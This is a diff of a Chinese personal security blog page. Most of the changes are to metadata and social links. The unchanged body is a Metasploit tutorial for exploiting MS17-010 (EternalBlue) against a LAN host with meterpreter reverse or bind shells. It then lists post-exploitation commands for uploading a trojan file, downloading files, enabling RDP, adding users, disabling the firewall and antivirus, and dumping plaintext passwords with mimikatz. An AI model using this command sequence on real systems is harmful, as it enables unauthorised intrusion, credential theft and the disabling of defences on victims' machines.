@@ -81,17 +81,17 @@
 
 
 
-<meta name="description" content="记录每天的进步，只有努力不会背叛自己！ MSF 使用ms17-010渗透测试">
+<meta name="description" content="ms17-010可谓一世英雄">
 <meta property="og:type" content="article">
-<meta property="og:title" content="MSF">
+<meta property="og:title" content="使用ms17-010渗透测试">
 <meta property="og:url" content="http://yoursite.com/2017/09/20/msf_17_010/index.html">
 <meta property="og:site_name" content="ESE&#39;s Note">
-<meta property="og:description" content="记录每天的进步，只有努力不会背叛自己！ MSF 使用ms17-010渗透测试">
+<meta property="og:description" content="ms17-010可谓一世英雄">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2017-10-02T08:49:35.512Z">
+<meta property="og:updated_time" content="2017-11-09T11:40:30.699Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="MSF">
-<meta name="twitter:description" content="记录每天的进步，只有努力不会背叛自己！ MSF 使用ms17-010渗透测试">
+<meta name="twitter:title" content="使用ms17-010渗透测试">
+<meta name="twitter:description" content="ms17-010可谓一世英雄">
 
 
 
@@ -127,7 +127,7 @@
 
 
 
-  <title>MSF | ESE's Note</title>
+  <title>使用ms17-010渗透测试 | ESE's Note</title>
   
 
 
@@ -257,7 +257,7 @@
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/20/msf_17_010/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="ESE">
+      <meta itemprop="name" content="">
       <meta itemprop="description" content="">
       <meta itemprop="image" content="/images/avatar.png">
     </span>
@@ -271,7 +271,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">MSF</h1>
+          <h1 class="post-title" itemprop="name headline">使用ms17-010渗透测试</h1>
         
 
         <div class="post-meta">
@@ -325,8 +325,7 @@
       
 
       
-        <p>记录每天的进步，只有努力不会背叛自己！</p>
-<h1 id="MSF-使用ms17-010渗透测试"><a href="#MSF-使用ms17-010渗透测试" class="headerlink" title="MSF 使用ms17-010渗透测试"></a>MSF 使用ms17-010渗透测试</h1><a id="more"></a>
+        <p>ms17-010可谓一世英雄<br><a id="more"></a></p>
 <h2 id="1、漏洞检测"><a href="#1、漏洞检测" class="headerlink" title="1、漏洞检测"></a>1、漏洞检测</h2><p>运行数据库<br><code>service postgresql start</code><br>启动msfconsole<br><code>msfconsole -q</code><br>使用smb_ms17_010模块探测MS17-010漏洞<br><code>use auxiliary/scanner/smb/smb_ms17_010</code><br><code>set rhosts 192.168.1.134</code></p>
 <h2 id="2、把扫描结果进行ms17-010漏洞检测"><a href="#2、把扫描结果进行ms17-010漏洞检测" class="headerlink" title="2、把扫描结果进行ms17-010漏洞检测"></a>2、把扫描结果进行ms17-010漏洞检测</h2><p>使用攻击模块<br><code>use exploit/windows/smb/ms17_010_eternalblue</code><br>option（or info）查看参数<br><code>set rhost 192.168.1.134</code><br>这需要路由器开放端口，才能返弹<br><code>set payload windows/x64/meterpreter/reverse_tcp</code><br>这直接绑定<br><code>set payload windows/x64/meterpreter/bind_tcp</code><br>run运行</p>
 <h2 id="3、meterpreter的基本命令"><a href="#3、meterpreter的基本命令" class="headerlink" title="3、meterpreter的基本命令"></a>3、meterpreter的基本命令</h2><p>1.getwd命令：可以获取当前目标机器的工作目录，也可以获得当前系统的工作目录,getuid,getpid<br>2.upload命令：可以上传文件或文件夹到目标机器<br><code>upload /root/muma.py d:\\</code><br>3.download命令：从目标机器上下载文件夹或者文件到攻击机<br><code>download muma.py /root</code><br>4.search命令：支持对远程目标机器上的文件进行搜索<br>5.portfwd命令：这个是meterpreter内嵌的端口转发器,目标主机开放的远程桌面3389端口<br><code>portfwd add -l 3389 -r 10.21.13.225 -p 3389</code><br>这条命令也可以开启3389远程桌面<br><code>run post/windows/manage/enable_rdp</code><br>或<br><code>run getgui -e</code><br>6.ps命令可以用来获取目标主机上正在运行的进程信息<br>7.migrate命令，将当前meterpreter会话从一个进程移植到另外一个进程的内存空间中,如果该程序中断，meterpreter也会中断<br><code>migrate 10652(pid)</code><br>8.execute命令：可以在目标机中执行文件<br><code>execute -H -f cmd.exe</code><br>9.关闭目标机器的防火墙<br><code>netsh adcfirewall set allprofiles state off</code><br>10.添加用户<br><code>run getgui -u xxxxx -p xxxxx</code><br>11.关闭杀毒软件<br><code>run killav</code><br>12.屏幕截图<br><code>screenshot</code><br>13.shell进入windows命令行，exit()回到meterpreter<br>14.打开cmd命令行，看看已打开的端口<br><code>netstat -ano</code><br>15.测试是不是虚拟机<br><code>run post/windows/gather/checkvm</code><br>16.获取明文账号和密码<br><code>load mimikatz</code><br><code>kerberos</code><br><code>msv</code></p>
@@ -370,8 +369,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/09/20/re_ctf_start/" rel="next" title="RE_start">
-                <i class="fa fa-chevron-left"></i> RE_start
+              <a href="/2017/09/20/re_ctf_start/" rel="next" title="RE_开始到开始">
+                <i class="fa fa-chevron-left"></i> RE_开始到开始
               </a>
             
           </div>
@@ -380,8 +379,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2017/09/20/re_SFX/" rel="prev" title="RE_sfx">
-                RE_sfx <i class="fa fa-chevron-right"></i>
+              <a href="/2017/09/21/re_elf_debugging/" rel="prev" title="RE_Windows下IDA动态调试linux的ELF">
+                RE_Windows下IDA动态调试linux的ELF <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -450,9 +449,9 @@
             
               <img class="site-author-image" itemprop="image"
                 src="/images/avatar.png"
-                alt="ESE" />
+                alt="" />
             
-              <p class="site-author-name" itemprop="name">ESE</p>
+              <p class="site-author-name" itemprop="name"></p>
               <p class="site-description motion-element" itemprop="description"></p>
           </div>
 
@@ -488,21 +487,27 @@
             
               
                 <span class="links-of-author-item">
-                  <a href="https://github.com/yourname" target="_blank" title="GitHub">
+                  <a href="https://github.com/saucxs/" target="_blank" title="GitHub">
                     
                       <i class="fa fa-fw fa-github"></i>GitHub</a>
                 </span>
               
                 <span class="links-of-author-item">
-                  <a href="https://twitter.com/yourname" target="_blank" title="Twitter">
+                  <a href="https://weibo.com/" target="_blank" title="Twitter">
                     
                       <i class="fa fa-fw fa-twitter"></i>Twitter</a>
                 </span>
               
                 <span class="links-of-author-item">
-                  <a href="https://github.com/yourname" target="_blank" title="Zhihu">
+                  <a href="https://www.zhihu.com/people/ese-76-83/activities" target="_blank" title="Zhihu">
                     
-                      <i class="fa fa-fw fa-qq"></i>Zhihu</a>
+                      <i class="fa fa-fw fa-drupal"></i>Zhihu</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://weibo.com/5899672336/profile?topnav=1&wvr=6/&is_all=1" target="_blank" title="Weibo">
+                    
+                      <i class="fa fa-fw fa-weibo"></i>Weibo</a>
                 </span>
               
             
@@ -513,10 +518,10 @@
 
           
           
-            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
               <div class="links-of-blogroll-title">
-                <i class="fa  fa-fw fa-link"></i>
-                Links
+                <i class="fa  fa-fw fa-globe"></i>
+                
               </div>
               <ul class="links-of-blogroll-list">
                 
@@ -575,7 +580,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#MSF-使用ms17-010渗透测试"><span class="nav-number">1.</span> <span class="nav-text">MSF 使用ms17-010渗透测试</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1、漏洞检测"><span class="nav-number">1.1.</span> <span class="nav-text">1、漏洞检测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2、把扫描结果进行ms17-010漏洞检测"><span class="nav-number">1.2.</span> <span class="nav-text">2、把扫描结果进行ms17-010漏洞检测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3、meterpreter的基本命令"><span class="nav-number">1.3.</span> <span class="nav-text">3、meterpreter的基本命令</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1、漏洞检测"><span class="nav-number">1.</span> <span class="nav-text">1、漏洞检测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2、把扫描结果进行ms17-010漏洞检测"><span class="nav-number">2.</span> <span class="nav-text">2、把扫描结果进行ms17-010漏洞检测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3、meterpreter的基本命令"><span class="nav-number">3.</span> <span class="nav-text">3、meterpreter的基本命令</span></a></li></ol></div>
             
 
           </div>
@@ -600,7 +605,7 @@
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
-  <span class="author" itemprop="copyrightHolder">ESE</span>
+  <span class="author" itemprop="copyrightHolder"></span>
 
   
 </div>
@@ -619,7 +624,7 @@
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共18.6k字</span>
+  <span class="post-count">博客全站共17.9k字</span>
 </div>
 
         
